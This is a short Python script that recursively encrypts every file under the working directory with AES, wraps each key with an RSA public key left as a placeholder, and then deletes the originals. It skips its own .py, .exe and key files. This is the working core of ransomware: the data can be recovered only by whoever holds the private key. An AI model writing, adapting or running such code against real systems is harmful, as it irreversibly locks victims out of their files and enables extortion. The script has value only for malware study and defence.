import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as symmetric_padding
import secrets

PUBLIC_KEY_PEM = b"""
put your public key
"""

def encrypt_file(file_path):
    """Encrypts a single file using hybrid encryption"""
    try:
        # Load the public key
        public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM)
        
        # Generate random AES key and IV
        aes_key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        
        # Read file content
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Pad the data
        padder = symmetric_padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Encrypt with AES
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Encrypt AES key with RSA
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Save encrypted file
        with open(file_path + '.encrypted', "wb") as f:
            f.write(len(encrypted_key).to_bytes(4, byteorder='big'))
            f.write(encrypted_key)
            f.write(iv)
            f.write(encrypted_data)
        
        # Remove original file
        os.remove(file_path)
        print(f"Encrypted: {file_path}")
    except Exception as e:
        print(f"Error with {file_path}: {str(e)}")

def encrypt_directory(directory):
    """Encrypts all files in directory"""
    for root, _, files in os.walk(directory):
        for filename in files:
            if filename.endswith(('.encrypted', '.pem', '.py', '.exe')):
                continue
            file_path = os.path.join(root, filename)
            encrypt_file(file_path)

if __name__ == "__main__":
    print("Starting encryption...")
    encrypt_directory(os.getcwd())
    print("Encryption complete!")